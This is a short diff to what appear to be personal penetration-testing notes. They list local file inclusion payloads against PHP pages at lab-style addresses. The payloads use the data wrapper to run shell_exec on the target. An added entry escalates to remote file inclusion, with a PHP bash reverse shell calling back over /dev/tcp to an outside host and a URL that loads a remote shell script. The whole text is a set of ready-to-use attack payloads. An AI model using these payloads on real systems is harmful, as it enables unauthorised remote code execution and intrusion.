@@ -13,3 +13,6 @@ http://10.11.0.22/menu.php?file=data:text/plain,hello world
 #A sample LFI payload using the data wrapper
 http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
 
+#lfi to rfi
+#<?php shell_exec("bash -i >& /dev/tcp/192.168.119.172/443 0>&1"); ?>
+http://10.11.1.35/section.php?page=http://192.168.119.172/shell2.php
